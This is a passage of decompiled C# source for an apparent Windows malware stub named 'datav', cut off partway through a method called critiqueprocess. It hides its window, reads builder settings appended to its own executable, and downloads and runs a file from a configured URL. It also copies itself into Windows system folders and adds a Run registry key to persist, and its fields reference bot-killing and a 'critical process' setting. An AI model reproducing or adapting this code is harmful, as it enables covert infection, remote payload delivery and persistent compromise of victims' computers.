using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using datav.My;

namespace datav;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	[AccessedThroughProperty("TextBox6")]
	private TextBox _TextBox6;

	[AccessedThroughProperty("TextBox5")]
	private TextBox _TextBox5;

	[AccessedThroughProperty("TextBox7")]
	private TextBox _TextBox7;

	[AccessedThroughProperty("TextBox8")]
	private TextBox _TextBox8;

	[AccessedThroughProperty("TextBox9")]
	private TextBox _TextBox9;

	[AccessedThroughProperty("TextBox10")]
	private TextBox _TextBox10;

	[AccessedThroughProperty("TextBox11")]
	private TextBox _TextBox11;

	[AccessedThroughProperty("TextBox12")]
	private TextBox _TextBox12;

	[AccessedThroughProperty("TextBox13")]
	private TextBox _TextBox13;

	[AccessedThroughProperty("TextBox14")]
	private TextBox _TextBox14;

	[AccessedThroughProperty("TextBox15")]
	private TextBox _TextBox15;

	[AccessedThroughProperty("TextBox16")]
	private TextBox _TextBox16;

	[AccessedThroughProperty("TextBox17")]
	private TextBox _TextBox17;

	[AccessedThroughProperty("TextBox18")]
	private TextBox _TextBox18;

	[AccessedThroughProperty("TextBox19")]
	private TextBox _TextBox19;

	[AccessedThroughProperty("TextBox20")]
	private TextBox _TextBox20;

	[AccessedThroughProperty("TextBox21")]
	private TextBox _TextBox21;

	[AccessedThroughProperty("TextBox22")]
	private TextBox _TextBox22;

	[AccessedThroughProperty("TextBox23")]
	private TextBox _TextBox23;

	[AccessedThroughProperty("TextBox24")]
	private TextBox _TextBox24;

	[AccessedThroughProperty("TextBox25")]
	private TextBox _TextBox25;

	[AccessedThroughProperty("TextBox26")]
	private TextBox _TextBox26;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	private string statuscritique;

	private string botkill;

	private string libri;

	private string hidefilms;

	private string checkck;

	private const int WM_COMMAND = 273;

	private const int MF_ENABLED = 0;

	private const int LVM_FIRST = 4096;

	private const int LVM_DELETEITEM = 4104;

	private const int LVM_SORTITEMS = 4144;

	private const int MF_GRAYED = 1;

	private string urlweb;

	private string downlibri;

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Timer1 = value;
		}
	}

	internal virtual TextBox TextBox4
	{
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox4 = value;
		}
	}

	internal virtual TextBox TextBox6
	{
		get
		{
			return _TextBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox6 = value;
		}
	}

	internal virtual TextBox TextBox5
	{
		get
		{
			return _TextBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox5 = value;
		}
	}

	internal virtual TextBox TextBox7
	{
		get
		{
			return _TextBox7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox7 = value;
		}
	}

	internal virtual TextBox TextBox8
	{
		get
		{
			return _TextBox8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox8 = value;
		}
	}

	internal virtual TextBox TextBox9
	{
		get
		{
			return _TextBox9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox9 = value;
		}
	}

	internal virtual TextBox TextBox10
	{
		get
		{
			return _TextBox10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox10 = value;
		}
	}

	internal virtual TextBox TextBox11
	{
		get
		{
			return _TextBox11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox11 = value;
		}
	}

	internal virtual TextBox TextBox12
	{
		get
		{
			return _TextBox12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox12 = value;
		}
	}

	internal virtual TextBox TextBox13
	{
		get
		{
			return _TextBox13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox13 = value;
		}
	}

	internal virtual TextBox TextBox14
	{
		get
		{
			return _TextBox14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox14 = value;
		}
	}

	internal virtual TextBox TextBox15
	{
		get
		{
			return _TextBox15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox15 = value;
		}
	}

	internal virtual TextBox TextBox16
	{
		get
		{
			return _TextBox16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox16 = value;
		}
	}

	internal virtual TextBox TextBox17
	{
		get
		{
			return _TextBox17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox17 = value;
		}
	}

	internal virtual TextBox TextBox18
	{
		get
		{
			return _TextBox18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox18 = value;
		}
	}

	internal virtual TextBox TextBox19
	{
		get
		{
			return _TextBox19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox19 = value;
		}
	}

	internal virtual TextBox TextBox20
	{
		get
		{
			return _TextBox20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox20 = value;
		}
	}

	internal virtual TextBox TextBox21
	{
		get
		{
			return _TextBox21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox21 = value;
		}
	}

	internal virtual TextBox TextBox22
	{
		get
		{
			return _TextBox22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox22 = value;
		}
	}

	internal virtual TextBox TextBox23
	{
		get
		{
			return _TextBox23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox23 = value;
		}
	}

	internal virtual TextBox TextBox24
	{
		get
		{
			return _TextBox24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox24 = value;
		}
	}

	internal virtual TextBox TextBox25
	{
		get
		{
			return _TextBox25;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox25 = value;
		}
	}

	internal virtual TextBox TextBox26
	{
		get
		{
			return _TextBox26;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox26 = value;
		}
	}

	internal virtual Timer Timer2
	{
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual WebBrowser WebBrowser1
	{
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_WebBrowser1 = value;
		}
	}

	internal virtual Timer Timer3
	{
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual ListView ListView1
	{
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListView1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Expected O, but got Unknown
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Expected O, but got Unknown
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Expected O, but got Unknown
		components = new Container();
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		Timer1 = new Timer(components);
		TextBox4 = new TextBox();
		TextBox6 = new TextBox();
		TextBox5 = new TextBox();
		TextBox7 = new TextBox();
		TextBox8 = new TextBox();
		TextBox9 = new TextBox();
		TextBox10 = new TextBox();
		TextBox11 = new TextBox();
		TextBox12 = new TextBox();
		TextBox13 = new TextBox();
		TextBox14 = new TextBox();
		TextBox15 = new TextBox();
		TextBox16 = new TextBox();
		TextBox17 = new TextBox();
		TextBox18 = new TextBox();
		TextBox19 = new TextBox();
		TextBox20 = new TextBox();
		TextBox21 = new TextBox();
		TextBox22 = new TextBox();
		TextBox23 = new TextBox();
		TextBox24 = new TextBox();
		TextBox25 = new TextBox();
		TextBox26 = new TextBox();
		Timer2 = new Timer(components);
		WebBrowser1 = new WebBrowser();
		Timer3 = new Timer(components);
		ListView1 = new ListView();
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(12, 2);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TextBox textBox3 = TextBox2;
		location = new Point(12, 41);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(100, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		TextBox textBox5 = TextBox3;
		location = new Point(12, 80);
		((Control)textBox5).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(100, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(2);
		TextBox textBox7 = TextBox4;
		location = new Point(100, 106);
		((Control)textBox7).set_Location(location);
		((Control)TextBox4).set_Name("TextBox4");
		TextBox textBox8 = TextBox4;
		size = new Size(100, 20);
		((Control)textBox8).set_Size(size);
		((Control)TextBox4).set_TabIndex(3);
		TextBox textBox9 = TextBox6;
		location = new Point(131, 80);
		((Control)textBox9).set_Location(location);
		((Control)TextBox6).set_Name("TextBox6");
		TextBox textBox10 = TextBox6;
		size = new Size(100, 20);
		((Control)textBox10).set_Size(size);
		((Control)TextBox6).set_TabIndex(4);
		TextBox textBox11 = TextBox5;
		location = new Point(-30, 106);
		((Control)textBox11).set_Location(location);
		((Control)TextBox5).set_Name("TextBox5");
		TextBox textBox12 = TextBox5;
		size = new Size(100, 20);
		((Control)textBox12).set_Size(size);
		((Control)TextBox5).set_TabIndex(5);
		TextBox textBox13 = TextBox7;
		location = new Point(106, 160);
		((Control)textBox13).set_Location(location);
		((Control)TextBox7).set_Name("TextBox7");
		TextBox textBox14 = TextBox7;
		size = new Size(100, 20);
		((Control)textBox14).set_Size(size);
		((Control)TextBox7).set_TabIndex(6);
		TextBox textBox15 = TextBox8;
		location = new Point(0, 149);
		((Control)textBox15).set_Location(location);
		((Control)TextBox8).set_Name("TextBox8");
		TextBox textBox16 = TextBox8;
		size = new Size(100, 20);
		((Control)textBox16).set_Size(size);
		((Control)TextBox8).set_TabIndex(7);
		TextBox textBox17 = TextBox9;
		location = new Point(106, 12);
		((Control)textBox17).set_Location(location);
		((Control)TextBox9).set_Name("TextBox9");
		TextBox textBox18 = TextBox9;
		size = new Size(100, 20);
		((Control)textBox18).set_Size(size);
		((Control)TextBox9).set_TabIndex(8);
		TextBox textBox19 = TextBox10;
		location = new Point(85, 54);
		((Control)textBox19).set_Location(location);
		((Control)TextBox10).set_Name("TextBox10");
		TextBox textBox20 = TextBox10;
		size = new Size(100, 20);
		((Control)textBox20).set_Size(size);
		((Control)TextBox10).set_TabIndex(9);
		TextBox textBox21 = TextBox11;
		location = new Point(76, 121);
		((Control)textBox21).set_Location(location);
		((Control)TextBox11).set_Name("TextBox11");
		TextBox textBox22 = TextBox11;
		size = new Size(100, 20);
		((Control)textBox22).set_Size(size);
		((Control)TextBox11).set_TabIndex(10);
		TextBox textBox23 = TextBox12;
		location = new Point(0, 0);
		((Control)textBox23).set_Location(location);
		((Control)TextBox12).set_Name("TextBox12");
		TextBox textBox24 = TextBox12;
		size = new Size(100, 20);
		((Control)textBox24).set_Size(size);
		((Control)TextBox12).set_TabIndex(11);
		TextBox textBox25 = TextBox13;
		location = new Point(85, 38);
		((Control)textBox25).set_Location(location);
		((Control)TextBox13).set_Name("TextBox13");
		TextBox textBox26 = TextBox13;
		size = new Size(100, 20);
		((Control)textBox26).set_Size(size);
		((Control)TextBox13).set_TabIndex(12);
		TextBox textBox27 = TextBox14;
		location = new Point(0, 0);
		((Control)textBox27).set_Location(location);
		((Control)TextBox14).set_Name("TextBox14");
		TextBox textBox28 = TextBox14;
		size = new Size(100, 20);
		((Control)textBox28).set_Size(size);
		((Control)TextBox14).set_TabIndex(13);
		TextBox textBox29 = TextBox15;
		location = new Point(25, 80);
		((Control)textBox29).set_Location(location);
		((Control)TextBox15).set_Name("TextBox15");
		TextBox textBox30 = TextBox15;
		size = new Size(100, 20);
		((Control)textBox30).set_Size(size);
		((Control)TextBox15).set_TabIndex(14);
		TextBox textBox31 = TextBox16;
		location = new Point(0, 0);
		((Control)textBox31).set_Location(location);
		((Control)TextBox16).set_Name("TextBox16");
		TextBox textBox32 = TextBox16;
		size = new Size(100, 20);
		((Control)textBox32).set_Size(size);
		((Control)TextBox16).set_TabIndex(15);
		TextBox textBox33 = TextBox17;
		location = new Point(8, 8);
		((Control)textBox33).set_Location(location);
		((Control)TextBox17).set_Name("TextBox17");
		TextBox textBox34 = TextBox17;
		size = new Size(100, 20);
		((Control)textBox34).set_Size(size);
		((Control)TextBox17).set_TabIndex(16);
		TextBox textBox35 = TextBox18;
		location = new Point(16, 16);
		((Control)textBox35).set_Location(location);
		((Control)TextBox18).set_Name("TextBox18");
		TextBox textBox36 = TextBox18;
		size = new Size(100, 20);
		((Control)textBox36).set_Size(size);
		((Control)TextBox18).set_TabIndex(17);
		TextBox textBox37 = TextBox19;
		location = new Point(0, 0);
		((Control)textBox37).set_Location(location);
		((Control)TextBox19).set_Name("TextBox19");
		TextBox textBox38 = TextBox19;
		size = new Size(100, 20);
		((Control)textBox38).set_Size(size);
		((Control)TextBox19).set_TabIndex(18);
		TextBox textBox39 = TextBox20;
		location = new Point(0, 0);
		((Control)textBox39).set_Location(location);
		((Control)TextBox20).set_Name("TextBox20");
		TextBox textBox40 = TextBox20;
		size = new Size(100, 20);
		((Control)textBox40).set_Size(size);
		((Control)TextBox20).set_TabIndex(19);
		TextBox textBox41 = TextBox21;
		location = new Point(8, 8);
		((Control)textBox41).set_Location(location);
		((Control)TextBox21).set_Name("TextBox21");
		TextBox textBox42 = TextBox21;
		size = new Size(100, 20);
		((Control)textBox42).set_Size(size);
		((Control)TextBox21).set_TabIndex(20);
		TextBox textBox43 = TextBox22;
		location = new Point(0, 0);
		((Control)textBox43).set_Location(location);
		((Control)TextBox22).set_Name("TextBox22");
		TextBox textBox44 = TextBox22;
		size = new Size(100, 20);
		((Control)textBox44).set_Size(size);
		((Control)TextBox22).set_TabIndex(21);
		TextBox textBox45 = TextBox23;
		location = new Point(0, 0);
		((Control)textBox45).set_Location(location);
		((Control)TextBox23).set_Name("TextBox23");
		TextBox textBox46 = TextBox23;
		size = new Size(100, 20);
		((Control)textBox46).set_Size(size);
		((Control)TextBox23).set_TabIndex(22);
		TextBox textBox47 = TextBox24;
		location = new Point(0, 0);
		((Control)textBox47).set_Location(location);
		((Control)TextBox24).set_Name("TextBox24");
		TextBox textBox48 = TextBox24;
		size = new Size(100, 20);
		((Control)textBox48).set_Size(size);
		((Control)TextBox24).set_TabIndex(23);
		TextBox textBox49 = TextBox25;
		location = new Point(0, 0);
		((Control)textBox49).set_Location(location);
		((Control)TextBox25).set_Name("TextBox25");
		TextBox textBox50 = TextBox25;
		size = new Size(100, 20);
		((Control)textBox50).set_Size(size);
		((Control)TextBox25).set_TabIndex(24);
		TextBox textBox51 = TextBox26;
		location = new Point(0, 0);
		((Control)textBox51).set_Location(location);
		((Control)TextBox26).set_Name("TextBox26");
		TextBox textBox52 = TextBox26;
		size = new Size(100, 20);
		((Control)textBox52).set_Size(size);
		((Control)TextBox26).set_TabIndex(25);
		WebBrowser webBrowser = WebBrowser1;
		location = new Point(0, 67);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		size = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(size);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser webBrowser3 = WebBrowser1;
		size = new Size(250, 250);
		((Control)webBrowser3).set_Size(size);
		((Control)WebBrowser1).set_TabIndex(26);
		ListView listView = ListView1;
		location = new Point(0, 0);
		((Control)listView).set_Location(location);
		((Control)ListView1).set_Name("ListView1");
		ListView listView2 = ListView1;
		size = new Size(121, 97);
		((Control)listView2).set_Size(size);
		((Control)ListView1).set_TabIndex(27);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(104, 87);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ListView1);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)this).get_Controls().Add((Control)(object)TextBox26);
		((Control)this).get_Controls().Add((Control)(object)TextBox25);
		((Control)this).get_Controls().Add((Control)(object)TextBox24);
		((Control)this).get_Controls().Add((Control)(object)TextBox23);
		((Control)this).get_Controls().Add((Control)(object)TextBox22);
		((Control)this).get_Controls().Add((Control)(object)TextBox21);
		((Control)this).get_Controls().Add((Control)(object)TextBox20);
		((Control)this).get_Controls().Add((Control)(object)TextBox19);
		((Control)this).get_Controls().Add((Control)(object)TextBox18);
		((Control)this).get_Controls().Add((Control)(object)TextBox17);
		((Control)this).get_Controls().Add((Control)(object)TextBox16);
		((Control)this).get_Controls().Add((Control)(object)TextBox15);
		((Control)this).get_Controls().Add((Control)(object)TextBox14);
		((Control)this).get_Controls().Add((Control)(object)TextBox13);
		((Control)this).get_Controls().Add((Control)(object)TextBox12);
		((Control)this).get_Controls().Add((Control)(object)TextBox11);
		((Control)this).get_Controls().Add((Control)(object)TextBox10);
		((Control)this).get_Controls().Add((Control)(object)TextBox9);
		((Control)this).get_Controls().Add((Control)(object)TextBox8);
		((Control)this).get_Controls().Add((Control)(object)TextBox7);
		((Control)this).get_Controls().Add((Control)(object)TextBox5);
		((Control)this).get_Controls().Add((Control)(object)TextBox6);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowExA(int hWnd1, int hWnd2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool EnableWindow(int hwnd, int fEnable);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetMenu(int hwnd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetSubMenu(int hMenu, int nPos);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetMenuItemID(int hMenu, int nPos);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnableMenuItem(int hMenu, int wIDEnableItem, int wEnable);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA(int hWnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lParam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDesktopWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LockWindowUpdate(int hwndLock);

	private static int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength)
	{
		return 0;
	}

	public void LOL()
	{
		try
		{
			string text = File.ReadAllText(Application.get_ExecutablePath());
			if (text.Contains("FileSplit"))
			{
				string[] array = Strings.Split(text, "FileSplit", -1, (CompareMethod)0);
				int num = Information.UBound((Array)array, 1);
				for (int i = 1; i <= num; i = checked(i + 1))
				{
					TextBox1.set_Text(array[1]);
					TextBox2.set_Text(array[2]);
					TextBox3.set_Text(array[3]);
					TextBox6.set_Text(array[4]);
					TextBox5.set_Text(array[5]);
					TextBox7.set_Text(array[6]);
					TextBox8.set_Text(array[7]);
					TextBox9.set_Text(array[8]);
					TextBox12.set_Text(array[9]);
					TextBox13.set_Text(array[10]);
					TextBox14.set_Text(array[11]);
					TextBox15.set_Text(array[12]);
					TextBox16.set_Text(array[13]);
					TextBox17.set_Text(array[14]);
					TextBox18.set_Text(array[15]);
					TextBox19.set_Text(array[16]);
					TextBox20.set_Text(array[17]);
					TextBox21.set_Text(array[18]);
					TextBox22.set_Text(array[19]);
					TextBox23.set_Text(array[20]);
					TextBox24.set_Text(array[21]);
					TextBox25.set_Text(array[22]);
					TextBox26.set_Text(array[23]);
					statuscritique = array[24];
					botkill = array[25];
					libri = array[26];
					downlibri = array[27];
					urlweb = array[28];
					checkck = array[29];
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void pizaa()
	{
		if (File.Exists(TextBox2.get_Text() + TextBox3.get_Text()))
		{
			File.Delete(TextBox2.get_Text() + TextBox3.get_Text());
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(TextBox1.get_Text(), TextBox2.get_Text() + TextBox3.get_Text());
			Process.Start(TextBox2.get_Text() + TextBox3.get_Text());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Installs()
	{
		try
		{
			if (Operators.CompareString(TextBox6.get_Text(), "1", false) == 0)
			{
				File.Copy(Application.get_ExecutablePath(), "C:\\Windows\\Temp\\" + TextBox5.get_Text() + ".exe");
				try
				{
					RegistryKey registryKey = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
					RegistryKey registryKey2 = registryKey;
					registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey2.SetValue(TextBox5.get_Text(), "C:\\Windows\\Temp\\" + TextBox5.get_Text() + ".exe");
					registryKey2 = null;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(TextBox7.get_Text(), "1", false) == 0)
			{
				File.Copy(Application.get_ExecutablePath(), "C:\\Windows\\" + TextBox5.get_Text() + ".exe");
				try
				{
					RegistryKey registryKey3 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
					RegistryKey registryKey4 = registryKey3;
					registryKey4.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey4.SetValue(TextBox5.get_Text(), "C:\\Windows\\" + TextBox5.get_Text() + ".exe");
					registryKey4 = null;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(TextBox8.get_Text(), "1", false) == 0)
			{
				File.Copy(Application.get_ExecutablePath(), "C:\\Windows\\System32\\" + TextBox5.get_Text() + ".exe");
				try
				{
					RegistryKey registryKey5 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
					RegistryKey registryKey6 = registryKey5;
					registryKey6.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey6.SetValue(TextBox5.get_Text(), "C:\\Windows\\System32\\" + TextBox5.get_Text() + ".exe");
					registryKey6 = null;
					return;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					return;
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	public void critiqueprocess()
	{
		if (Operators.CompareString(statuscritique, "1", false) == 0)
		{
